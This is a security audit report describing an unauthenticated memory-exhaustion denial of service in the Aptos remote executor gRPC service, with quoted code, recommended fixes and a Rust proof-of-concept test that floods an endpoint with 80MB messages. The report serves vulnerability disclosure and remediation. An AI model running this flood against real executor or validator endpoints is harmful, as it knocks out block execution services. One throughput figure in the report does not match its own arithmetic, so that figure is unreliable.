# Audit Report

## Title
Remote Executor Service: Unbounded Memory Exhaustion via NetworkMessage Flooding

## Summary
The remote executor service's gRPC endpoint accepts unauthenticated NetworkMessage instances up to 80MB in size and queues them into unbounded channels without rate limiting. An attacker can flood this endpoint with maximum-sized messages to cause heap exhaustion and trigger OOM crashes, denying block execution services.

## Finding Description

The remote executor service (`ExecutorService`) exposes a gRPC endpoint that accepts `NetworkMessage` instances for distributed execution coordination. This creates a resource exhaustion vulnerability through three compounding issues:

**Issue 1: Large Message Size Limit**

The gRPC service accepts messages up to 80MB: [1](#0-0) [2](#0-1) 

**Issue 2: Unbounded Channel Queueing**

Incoming messages are placed into unbounded crossbeam channels: [3](#0-2) 

The `unbounded()` function creates channels with no capacity limit, allowing unlimited message accumulation.

**Issue 3: No Authentication or Rate Limiting**

The gRPC endpoint processes all incoming messages without authentication checks: [4](#0-3) 

The handler only validates that a registered handler exists for the message type but performs no sender authentication, origin validation, or rate limiting.

**Attack Flow:**

1. Attacker discovers the executor service's exposed gRPC endpoint (configured via `--remote-executor-addresses` in production deployments)
2. Attacker sends thousands of `NetworkMessage` instances with 80MB payloads
3. Each message is accepted by the gRPC server and queued into the unbounded channel
4. If messages arrive faster than the receiver processes them (e.g., during heavy execution load), messages accumulate in memory
5. Heap memory grows unbounded until OOM killer terminates the process or system thrashing occurs
6. The executor service becomes unavailable, preventing block execution

The `NetworkMessage` struct has no inherent size limits beyond the gRPC configuration: [5](#0-4) 

An attacker can maximize the `message` field (Vec<u8>) to approach the 80MB limit and flood the channel with such messages.

## Impact Explanation

**Severity: HIGH** per Aptos bug bounty criteria

This vulnerability causes:

1. **Validator node slowdowns**: As memory fills, the system experiences thrashing and degraded performance affecting all node operations
2. **API crashes**: OOM conditions cause the executor service process to terminate
3. **Significant protocol violations**: Remote execution architecture becomes unavailable, preventing distributed block execution

The impact aligns with HIGH severity because it enables denial-of-service against the remote executor infrastructure. While this doesn't directly compromise consensus safety or cause fund loss, it breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits."

In production deployments using sharded execution, this attack would:
- Force fallback to local execution (reduced throughput)
- Cause repeated process restarts and instability
- Potentially trigger cascading failures if multiple executor shards are targeted simultaneously

## Likelihood Explanation

**Likelihood: HIGH**

This vulnerability is highly likely to be exploited because:

1. **Low Attack Complexity**: Attacker only needs to send gRPC requests - no special privileges, timing windows, or cryptographic operations required
2. **No Authentication Barrier**: The service has zero authentication checks, allowing any network-reachable actor to exploit it
3. **Easily Discoverable**: The executor service binds to configured socket addresses that may be discoverable through:
   - Misconfigured firewalls exposing internal services
   - Network scanning of validator infrastructure
   - Social engineering or leaked configuration files
4. **High Impact**: The 80MB per-message size amplifies the attack efficiency - an attacker with modest bandwidth (e.g., 1 Gbps) can send ~1.5 messages/second, accumulating ~4.8GB every minute if processing lags
5. **Real Deployment Exposure**: Per the wiki documentation, the `ProcessExecutorService` is designed for production multi-process deployments where executor shards run as separate processes communicating over the network

The attack requires no validator insider access or specialized knowledge - just basic gRPC client implementation skills.

## Recommendation

Implement multiple defense layers:

**1. Add Authentication and Authorization**

Implement mutual TLS or token-based authentication for executor service connections. The codebase already has authentication patterns in the validator network layer using Noise protocol handshakes that could be adapted.

**2. Replace Unbounded Channels with Bounded Channels**

```rust
// In secure/net/src/network_controller/mod.rs
pub fn create_inbound_channel(&mut self, message_type: String) -> Receiver<Message> {
    // Use bounded channel with configurable capacity
    const MAX_PENDING_MESSAGES: usize = 1000;
    let (inbound_sender, inbound_receiver) = bounded(MAX_PENDING_MESSAGES);
    
    self.inbound_handler
        .lock()
        .unwrap()
        .register_handler(message_type, inbound_sender);
    
    inbound_receiver
}
```

Apply similar changes to outbound channels.

**3. Add Per-Connection Rate Limiting**

Track message rates per remote address and reject connections exceeding thresholds:

```rust
// In secure/net/src/grpc_network_service/mod.rs
async fn simple_msg_exchange(
    &self,
    request: Request<NetworkMessage>,
) -> Result<Response<Empty>, Status> {
    let remote_addr = request.remote_addr();
    
    // Rate limit check (implementation needed)
    if self.rate_limiter.should_reject(remote_addr) {
        return Err(Status::resource_exhausted("Rate limit exceeded"));
    }
    
    // ... existing code
}
```

**4. Reduce Maximum Message Size**

Consider lowering `MAX_MESSAGE_SIZE` from 80MB to a more reasonable limit based on actual message size requirements (e.g., 10-20MB).

**5. Add Resource Monitoring**

Implement alerts when channel depths exceed thresholds, enabling operators to detect attacks in progress.

## Proof of Concept

```rust
// PoC demonstrating the vulnerability
// Add to execution/executor-service/src/tests.rs or create new test file

#[cfg(test)]
mod memory_exhaustion_poc {
    use aptos_protos::remote_executor::v1::{
        network_message_service_client::NetworkMessageServiceClient, NetworkMessage,
    };
    use aptos_secure_net::network_controller::NetworkController;
    use std::net::{IpAddr, Ipv4Addr, SocketAddr};
    use tokio::runtime::Runtime;

    #[test]
    #[ignore] // This test demonstrates DoS - run manually to verify
    fn test_memory_exhaustion_via_message_flooding() {
        // Setup executor service
        let server_port = aptos_config::utils::get_available_port();
        let server_addr = SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), server_port);
        
        let mut controller = NetworkController::new(
            "test_executor".to_string(),
            server_addr,
            5000,
        );
        
        // Register a handler that processes slowly
        let message_type = "execute_command_0".to_string();
        let rx = controller.create_inbound_channel(message_type.clone());
        controller.start();
        
        // Give server time to start
        std::thread::sleep(std::time::Duration::from_millis(100));
        
        // Attack: Flood with maximum-sized messages
        let rt = Runtime::new().unwrap();
        rt.block_on(async {
            let endpoint = format!("http://{}", server_addr);
            let mut client = NetworkMessageServiceClient::connect(endpoint)
                .await
                .expect("Failed to connect");
            
            // Send 1000 messages of 80MB each = 80GB of memory allocation
            for i in 0..1000 {
                let large_payload = vec![0u8; 80 * 1024 * 1024]; // 80 MB
                let msg = NetworkMessage {
                    message: large_payload,
                    message_type: message_type.clone(),
                };
                
                // This will succeed even though receiver cannot keep up
                client.simple_msg_exchange(msg).await.unwrap();
                
                if i % 10 == 0 {
                    println!("Sent {} messages, ~{}GB queued", i, i * 80 / 1024);
                }
            }
        });
        
        // At this point, if receiver is slow, memory is exhausted
        // In production, this would cause OOM
        
        controller.shutdown();
    }
}
```

**Expected Result**: Running this PoC with memory monitoring (e.g., `valgrind`, `heaptrack`) demonstrates unbounded memory growth as messages accumulate faster than they're processed. In a resource-constrained environment, this triggers OOM conditions.

---

## Notes

This vulnerability specifically affects the remote executor service deployment mode documented in the Execution Layer wiki. The `NetworkController` is designed for inter-process communication between the coordinator and executor shards, making it a critical component for production distributed execution architectures.

The vulnerability is exacerbated because the remote executor service is intended to be deployed on separate machines for horizontal scaling, potentially exposing the gRPC endpoints to network attackers if not properly firewalled. The absence of authentication makes this particularly severe - the design assumes a trusted network environment that may not exist in real deployments.

### Citations

**File:** secure/net/src/grpc_network_service/mod.rs (L23-23)
```rust
const MAX_MESSAGE_SIZE: usize = 1024 * 1024 * 80;
```

**File:** secure/net/src/grpc_network_service/mod.rs (L78-78)
```rust
                NetworkMessageServiceServer::new(self).max_decoding_message_size(MAX_MESSAGE_SIZE),
```

**File:** secure/net/src/grpc_network_service/mod.rs (L91-116)
```rust
#[tonic::async_trait]
impl NetworkMessageService for GRPCNetworkMessageServiceServerWrapper {
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
}
```

**File:** secure/net/src/network_controller/mod.rs (L128-136)
```rust
    pub fn create_inbound_channel(&mut self, message_type: String) -> Receiver<Message> {
        let (inbound_sender, inbound_receiver) = unbounded();

        self.inbound_handler
            .lock()
            .unwrap()
            .register_handler(message_type, inbound_sender);

        inbound_receiver
```

**File:** protos/rust/src/pb/aptos.remote_executor.v1.rs (L7-13)
```rust
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct NetworkMessage {
    #[prost(bytes="vec", tag="1")]
    pub message: ::prost::alloc::vec::Vec<u8>,
    #[prost(string, tag="2")]
    pub message_type: ::prost::alloc::string::String,
}
```
